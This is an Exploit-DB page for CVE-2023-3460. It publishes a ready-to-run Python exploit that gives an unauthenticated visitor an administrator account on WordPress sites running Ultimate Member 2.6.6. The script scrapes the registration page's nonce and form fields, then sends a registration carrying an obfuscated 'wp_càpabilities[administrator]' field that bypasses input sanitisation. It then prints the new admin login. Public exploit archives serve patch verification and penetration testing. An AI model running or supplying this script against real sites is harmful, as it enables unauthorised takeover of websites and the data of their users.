---
title: [webapps] Ultimate Member WordPress Plugin 2.6.6 - Privilege Escalation
url: https://www.exploit-db.com/exploits/52393
source: Exploit-DB.com RSS Feed
date: 2025-08-04
fetch_date: 2025-10-07T00:14:59.000318
---

# [webapps] Ultimate Member WordPress Plugin 2.6.6 - Privilege Escalation

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Ultimate Member WordPress Plugin 2.6.6 - Privilege Escalation

#### EDB-ID:

###### 52393

#### CVE:

###### [2023-3460](https://nvd.nist.gov/vuln/detail/CVE-2023-3460)

---

**EDB Verified:**

#### Author:

###### [Gurjot Singh](/?author=12306)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-03

---

**Vulnerable App:**

```
#!/usr/bin/env python3

# Exploit Title: Ultimate Member WordPress Plugin 2.6.6 - Privilege Escalation
# Exploit Author: Gurjot Singh
# CVE: CVE-2023-3460
# Description : The attached PoC demonstrates how an unauthenticated attacker can escalate privileges to admin by abusing unsanitized input in `wp_capabilities` during registration.

import requests
import argparse
import re
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_password_strength(password):
    """Checks if password meets complexity requirements."""
    if len(password) < 8:
        print("[!] Password too short! Must be at least 8 characters.")
        print("    Example: Admin@123")
        sys.exit(1)

    # At least one uppercase, one lowercase, one digit, and one special char
    if not re.search(r'[A-Z]', password):
        print("[!] Password must contain at least one uppercase letter.")
        print("    Example: Admin@123")
        sys.exit(1)
    if not re.search(r'[a-z]', password):
        print("[!] Password must contain at least one lowercase letter.")
        print("    Example: Admin@123")
        sys.exit(1)
    if not re.search(r'\d', password):
        print("[!] Password must contain at least one number.")
        print("    Example: Admin@123")
        sys.exit(1)
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        print("[!] Password must contain at least one special character (!@#$%^&* etc.)")
        print("    Example: Admin@123")
        sys.exit(1)

def fetch_form_details(session, target_url):
    print("[*] Fetching form details from register page...")
    try:
        res = session.get(target_url, verify=False)
        soup = BeautifulSoup(res.text, "html.parser")

        nonce_input = soup.find("input", {"name": "_wpnonce"})
        nonce = nonce_input["value"] if nonce_input else None
        if nonce:
            print(f"[+] Found _wpnonce: {nonce}")
        else:
            print("[-] Could not find _wpnonce")

        field_names = {}
        for inp in soup.find_all("input"):
            if inp.get("name"):
                field_names[inp.get("name")] = ""

        return nonce, field_names
    except Exception as e:
        print(f"[!] Error fetching form details: {e}")
        return None, {}

def exploit_register(target_url, username, password):
    session = requests.Session()
    target_url = target_url.rstrip('/')

    nonce, fields = fetch_form_details(session, target_url)
    if not nonce:
        return

    form_id = None
    for name in fields:
        m = re.search(r"user_login-(\d+)", name)
        if m:
            form_id = m.group(1)
            break
    if not form_id:
        form_id = "7"
    print(f"[+] Using form ID: {form_id}")

    data = {
        f"user_login-{form_id}": username,
        f"first_name-{form_id}": "Admin",
        f"last_name-{form_id}": username,
        f"user_email-{form_id}": f"{username}@example.com",
        f"user_password-{form_id}": password,
        f"confirm_user_password-{form_id}": password,
        "form_id": form_id,
        "um_request": "",
        "_wpnonce": nonce,
        "_wp_http_referer": "/register/",
        "wp_càpabilities[administrator]": "1"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Referer": target_url,
        "Origin": target_url.split("/register")[0],
    }
    cookies = {
        "wordpress_test_cookie": "WP Cookie check",
        "wp_lang": "en_US"
    }

    print(f"[*] Sending malicious registration for {username} ...")
    try:
        response = session.post(target_url, data=data, headers=headers, cookies=cookies, verify=False)
        if response.status_code == 200 and ("Thank you for registering" in response.text or "You have successfully registered" in response.text):
            print(f"[+] Admin account '{username}' created successfully!")
            print(f"[+] Login with: Username: {username} | Password: {password}")
        else:
            print(f"[-] Could not confirm success. Check target manually.")
    except Exception as e:
        print(f"[!] Error during exploit: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for CVE-2023-3460 (Ultimate Member Admin Account Creation)")
    parser.add_argument("-t", "--target", required=True, help="Target /register/ URL (e.g., http://localhost/register/)")
    parser.add_argument("-u", "--user", default="rakesh", help="Username to create")
    parser.add_argument("-p", "--password", default="Admin@123", help="Password for the new user")
    args = parser.parse_args()

    # Check password strength before running
    check_password_strength(args.password)

    exploit_register(args.target, args.user, args.password)
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www)

* [Exploit Database by OffSec](/)
* [Term...